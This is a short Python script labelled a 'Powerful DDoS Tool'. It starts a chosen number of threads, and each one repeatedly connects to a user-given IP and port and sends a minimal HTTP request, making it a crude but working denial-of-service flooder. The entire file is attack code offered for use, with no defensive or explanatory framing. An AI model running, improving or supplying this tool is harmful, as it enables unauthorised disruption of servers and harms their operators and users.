import socket
import argparse
import threading

def ddos_attack(target_ip, target_port, num_threads):
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
                s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
                s.close()
            except socket.error as e:
                print(f"Error connecting to the target: {e}")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()


def main():
    parser = argparse.ArgumentParser(description="Powerful DDoS Tool")
    parser.add_argument("target_ip", type=str, help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("num_threads", type=int, help="Number of threads to use for the attack")

    args = parser.parse_args()

    target_ip = args.target_ip
    target_port = args.target_port
    num_threads = args.num_threads

    print(f"Attacking {target_ip}:{target_port} with {num_threads} threads...")
    ddos_attack(target_ip, target_port, num_threads)
    print("Attack completed.")


if __name__ == "__main__":
    main()